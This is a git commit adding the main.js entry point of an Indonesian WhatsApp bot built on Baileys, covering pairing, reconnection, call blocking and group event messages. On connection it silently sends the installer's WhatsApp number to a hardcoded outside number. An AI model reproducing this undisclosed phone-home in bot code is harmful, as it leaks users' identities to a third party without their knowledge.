3d02023364b00d792f8a3058b633097069e8d831
BRIGHTZ-ee <wanjayggqq@gmail.com>
2024-08-11 09:13:19 +0700

    Add files via upload

---
+++ main.js
@@ -0,0 +1,160 @@
+require("./all/global")
+const func = require("./all/place")
+const readline = require("readline")
+const yargs = require('yargs/yargs')
+const _ = require('lodash')
+const usePairingCode = true
+const question = (text) => {
+const rl = readline.createInterface({
+input: process.stdin,
+output: process.stdout
+})
+return new Promise((resolve) => {
+rl.question(text, resolve)
+})}
+
+
+async function startSesi() {
+const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
+const { state, saveCreds } = await useMultiFileAuthState(`./session`)
+const { version, isLatest } = await fetchLatestBaileysVersion()
+
+const connectionOptions = {
+version: [2, 2413, 1],
+keepAliveIntervalMs: 30000,
+printQRInTerminal: !usePairingCode,
+logger: pino({ level: "fatal" }),
+auth: state,
+browser: ["Ubuntu","Chrome","20.0.04"],
+getMessage: async (key) => {
+if (store) {
+const msg = await store.loadMessage(key.remoteJid, key.id, undefined)
+return msg?.message || undefined
+}
+return {
+conversation: 'WhatsApp Bot By RafatharCode'
+}}
+}
+
+const rafatharcode = func.makeWASocket(connectionOptions)
+if (usePairingCode && !rafatharcode.authState.creds.registered) {
+const phoneNumber = await question(color('Masukan Nomor Whatsapp Awali dengan 62 :\n', 'red'));
+const code = await rafatharcode.requestPairingCode(phoneNumber.trim())
+console.log(`${chalk.redBright('Your Pairing Code')} : ${code}`)
+}
+store?.bind(rafatharcode.ev)
+
+rafatharcode.ev.on('connection.update', async (update) => {
+const { connection, lastDisconnect } = update
+if (connection === 'close') {
+const reason = new Boom(lastDisconnect?.error)?.output.statusCode
+console.log(color(lastDisconnect.error, 'deeppink'))
+if (lastDisconnect.error == 'Error: Stream Errored (unknown)') {
+process.exit()
+} else if (reason === DisconnectReason.badSession) {
+console.log(color(`Bad Session File, Please Delete Session and Scan Again`))
+process.exit()
+} else if (reason === DisconnectReason.connectionClosed) {
+console.log(color('[SYSTEM]', 'white'), color('Connection closed, reconnecting...', 'deeppink'))
+process.exit()
+} else if (reason === DisconnectReason.connectionLost) {
+console.log(color('[SYSTEM]', 'white'), color('Connection lost, trying to reconnect', 'deeppink'))
+process.exit()
+} else if (reason === DisconnectReason.connectionReplaced) {
+console.log(color('Connection Replaced, Another New Session Opened, Please Close Current Session First'))
+rafatharcode.logout()
+} else if (reason === DisconnectReason.loggedOut) {
+console.log(color(`Device Logged Out, Please Scan Again And Run.`))
+rafatharcode.logout()
+} else if (reason === DisconnectReason.restartRequired) {
+console.log(color('Restart Required, Restarting...'))
+await startSesi()
+} else if (reason === DisconnectReason.timedOut) {
+console.log(color('Connection TimedOut, Reconnecting...'))
+startSesi()
+}
+} else if (connection === "connecting") {
+console.log(color('Menghubungkan . . . '))
+} else if (connection === "open") {
+let teksnotif = `*CPANEL RAFATHAR CODE* Berhasil Tersambung Ke Nomor WhatsApp ${rafatharcode.user.id.split(":")[0]}`
+rafatharcode.sendMessage("6283183432282@s.whatsapp.net", {text: teksnotif})
+console.log(color('Bot Berhasil Tersambung'))
+}
+})
+
+rafatharcode.ev.on('call', async (user) => {
+if (!global.anticall) return
+for (let ff of user) {
+if (ff.isGroup == false) {
+if (ff.status == "offer") {
+let sendcall = await rafatharcode.sendMessage(ff.from, {text: `@${ff.from.split("@")[0]} Maaf Kamu Akan Saya Block Karna Ownerbot Menyalakan Fitur *Anticall*\nJika Tidak Sengaja Segera Hubungi Owner Untuk Membuka Blokiran Ini`, contextInfo: {mentionedJid: [ff.from], externalAdReply: {showAdAttribution: true, thumbnail: fs.readFileSync("./media/warning.jpg"), title: "｢ CALL DETECTED ｣", previewType: "PHOTO"}}}, {quoted: null})
+rafatharcode.sendContact(ff.from, [owner], "Developer WhatsApp Bot", sendcall)
+await sleep(10000)
+await rafatharcode.updateBlockStatus(ff.from, "block")
+}}
+}})
+
+rafatharcode.ev.on('messages.upsert', async (chatUpdate) => {
+try {
+m = chatUpdate.messages[0]
+if (!m.message) return
+m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
+if (m.key && m.key.remoteJid === 'status@broadcast') return rafatharcode.readMessages([m.key])
+if (!rafatharcode.public && m.key.remoteJid !== global.owner+"@s.whatsapp.net" && !m.key.fromMe && chatUpdate.type === 'notify') return
+if (m.key.id.startsWith('BAE5') && m.key.id.length === 16) return
+if (global.autoread) rafatharcode.readMessages([m.key])
+m = func.smsg(rafatharcode, m, store)
+require("./rafatharcode.js")(rafatharcode, m, store)
+} catch (err) {
+console.log(err)
+}
+})
+
+rafatharcode.ev.on('group-participants.update', async (anu) => {
+if (!global.welcome) return
+let botNumber = await rafatharcode.decodeJid(rafatharcode.user.id)
+if (anu.participants.includes(botNumber)) return
+try {
+let metadata = await rafatharcode.groupMetadata(anu.id)
+let namagc = metadata.subject
+let participants = anu.participants
+for (let num of participants) {
+let check = anu.author !== num && anu.author.length > 1
+let tag = check ? [anu.author, num] : [num]
+try {
+ppuser = await rafatharcode.profilePictureUrl(num, 'image')
+} catch {
+ppuser = 'https://telegra.ph/file/30c0edbb3f11fce2e5245.jpg'
+}
+if (anu.action == 'add') {
+rafatharcode.sendMessage(anu.id, {text: check ? `@${anu.author.split("@")[0]} Telah Menambahkan @${num.split("@")[0]} Ke Dalam Grup Ini` : `Hallo Kak @${num.split("@")[0]} Selamat Datang Di *${namagc}*`, 
+contextInfo: {mentionedJid: [...tag], externalAdReply: { thumbnailUrl: ppuser, title: '© Welcome Message', body: '', renderLargerThumbnail: true, sourceUrl: linkgc, mediaType: 1}}})
+} 
+if (anu.action == 'remove') { 
+rafatharcode.sendMessage(anu.id, {text: check ? `@${anu.author.split("@")[0]} Telah Mengeluarkan @${num.split("@")[0]} Dari Grup Ini` : `@${num.split("@")[0]} Telah Keluar Dari Grup Ini`, 
+contextInfo: {mentionedJid: [...tag], externalAdReply: { thumbnailUrl: ppuser, title: '© Leaving Message', body: '', renderLargerThumbnail: true, sourceUrl: linkgc, mediaType: 1}}})
+}
+if (anu.action == "promote") {
+rafatharcode.sendMessage(anu.id, {text: `@${anu.author.split("@")[0]} Telah Menjadikan @${num.split("@")[0]} Sebagai Admin Grup Ini`, 
+contextInfo: {mentionedJid: [...tag], externalAdReply: { thumbnailUrl: ppuser, title: '© Promote Message', body: '', renderLargerThumbnail: true, sourceUrl: linkgc, mediaType: 1}}})
+}
+if (anu.action == "demote") {
+rafatharcode.sendMessage(anu.id, {text: `@${anu.author.split("@")[0]} Telah Memberhentikan @${num.split("@")[0]} Sebagai Admin Grup Ini`, 
+contextInfo: {mentionedJid: [...tag], externalAdReply: { thumbnailUrl: ppuser, title: '© Demote Message', body: '', renderLargerThumbnail: true, sourceUrl: linkgc, mediaType: 1}}})
+}
+} 
+} catch (err) {
+console.log(err)
+}})
+
+rafatharcode.public = true
+
+rafatharcode.ev.on('creds.update', saveCreds)
+return rafatharcode
+}
+
+startSesi()
+
+process.on('uncaughtException', function (err) {
+console.log('Caught exception: ', err)
+})
